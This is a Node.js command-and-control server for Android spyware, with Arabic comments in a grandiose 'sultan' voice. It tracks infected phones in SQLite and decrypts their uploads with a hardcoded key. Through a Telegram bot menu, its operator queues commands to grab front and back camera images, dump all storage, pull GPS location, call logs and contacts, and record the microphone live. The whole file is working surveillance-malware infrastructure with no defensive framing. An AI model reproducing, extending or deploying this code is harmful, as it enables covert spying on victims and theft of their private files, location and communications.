// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Matrix Nexus C2 Server v1000
// السلطان المطلق: ناصر دين الله الكلعي 💀🔥 | سيادة عسكرية وفك تشفير تام
// =========================================================================
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');

const token = process.env.TG_TOKEN || process.env.TELEGRAM_TOKEN;
const chatId = process.env.TG_ID || process.env.TELEGRAM_CHAT_ID;

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing for Nexus v1000.');
}

const STORAGE_DIR = path.join(__dirname, 'nexus_supreme_vault');
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_matrix_nexus_v1000.db', (err) => {
    if (err) console.error('[-] SQLite Connection Error:', err.message);
});

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nexus_nodes (id TEXT PRIMARY KEY, model TEXT, os TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS nexus_tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
    db.run(`CREATE TABLE IF NOT EXISTS nexus_vault (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, file_name TEXT, file_path TEXT, timestamp INTEGER)`);
});

const app = express();
const appBot = new telegramBot(token || "DUMMY_TOKEN", { polling: true });

const ENCRYPTION_KEY = "UraniumMatrixNexusSupremeAbsoluteKey2026!@#";

function decryptPayload(encryptedBase64) {
    try {
        const sha = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
        const decipher = crypto.createDecipheriv('aes-256-ecb', sha, null);
        let decrypted = decipher.update(encryptedBase64, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        return null;
    }
}

appBot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
    }
});

app.use(express.json({ limit: '10000mb' }));
app.use(express.urlencoded({ extended: true, limit: '10000mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '20000mb' }));

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#050505;color:#00ff66;font-family:monospace;text-align:center;padding-top:60px;"><h1>[☢️] URANIUM MATRIX NEXUS C2 SERVER v1000 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1><p>Absolute Military Superiority & Cryptographic Command Center</p></body></html>`);
});

app.post('/api/v1000/nexus/stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-nexus-node'] || req.body.node_id || 'nexus_node';
        const nodeModel = req.body.model || 'Unknown';
        const osVersion = req.body.os || 'Android';
        const encryptedPayload = req.body.payload;

        if (encryptedPayload) {
            const decryptedString = decryptPayload(encryptedPayload);
            if (decryptedString) {
                try {
                    const telemetryData = JSON.parse(decryptedString);
                    // معالجة البيانات القادمة من العقدة بنجاح
                } catch (jsonErr) {}
            }
        }

        db.run(`INSERT OR REPLACE INTO nexus_nodes (id, model, os, last_seen) VALUES (?, ?, ?, ?)`, 
            [nodeId, nodeModel, osVersion, Date.now()], (err) => {
                if (err) console.error('DB Insert Error:', err.message);
            });

        let directive = { status: 'ACK', task: null };

        db.get(`SELECT * FROM nexus_tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (!err && row) {
                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
                db.run(`UPDATE nexus_tasks SET status = 'DISPATCHED' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'ERROR', message: e.message });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, os, last_seen FROM nexus_nodes`, async (err, rows) => {
            if (err || !rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً في نظام Matrix Nexus v1000.</b>\n(بأمر السلطان ناصر دين الله الكلعي 👑🔥)`);
                return;
            }

            let keyboard = [];
            rows.forEach(node => {
                keyboard.push([{ text: `☢️ [Nexus v1000] ${node.model} (${node.id.substring(0, 6)})`, callback_data: `nexus_node_${node.id}` }]);
            });

            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة العمليات المركزية v1000:</b>\nاختر العقدة للسيطرة العسكرية التامة وسحب البيانات الخارقة:`, {
                reply_markup: { inline_keyboard: keyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;
    if (String(msg.chat.id) !== String(chatId)) return;

    if (data.startsWith('nexus_node_')) {
        const nodeId = data.replace('nexus_node_', '');
        await appBot.editMessageText(`👑 <b>لوحة تحكم العقدة الخارقة:</b> <code>${nodeId}</code>\nاختر العملية العسكرية المطلوبة يا سلطان الميدان:`, {
            chat_id: chatId,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📷 سحب الكاميرا الأمامية', callback_data: `cmd_${nodeId}_cam_front` },
                        { text: '📸 سحب الكاميرا الخلفية', callback_data: `cmd_${nodeId}_cam_back` }
                    ],
                    [
                        { text: '📂 سحب جميع الملفات والذاكرة', callback_data: `cmd_${nodeId}_dump_storage` },
                        { text: '📍 تحديد الموقع الجغرافي دقيق', callback_data: `cmd_${nodeId}_gps` }
                    ],
                    [
                        { text: '📞 سجل المكالمات والجهات', callback_data: `cmd_${nodeId}_call_logs` },
                        { text: '🎙️ تسجيل صوتي محيطي مباشر', callback_data: `cmd_${nodeId}_mic_rec` }
                    ],
                    [
                        { text: '🔙 العودة للقائمة الرئيسية', callback_data: 'back_to_main' }
                    ]
                ]
            }
        });
    } else if (data === 'back_to_main') {
        await appBot.deleteMessage(chatId, msg.message_id);
        await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة العليا v1000</b>\nأرسل /start لعرض العقد المتاحة.`);
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const nodeId = parts[1];
        const action = parts.slice(2).join('_');

        db.run(`INSERT INTO nexus_tasks (node_id, action, payload, status) VALUES (?, ?, ?, 'PENDING')`, [nodeId, action, '{}'], function(err) {
            if (!err) {
                appBot.answerCallbackQuery(query.id, { text: `✅ تم إرسال الأمر العسكري (${action}) بنجاح يا سلطان!` });
                sendTg(`🚀 <b>تم إرسال أمر عسكري جديد بنجاح:</b>\n- العقدة: <code>${nodeId}</code>\n- الأمر: <code>${action}</code>\n(بأمر السلطان ناصر دين الله الكلعي 💀🔥)`);
            } else {
                appBot.answerCallbackQuery(query.id, { text: `❌ فشل إرسال الأمر!` });
            }
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium Matrix Nexus C2 Server v1000 Online on port ${PORT} (السلطان ناصر دين الله الكلعي 👑🔥)`));
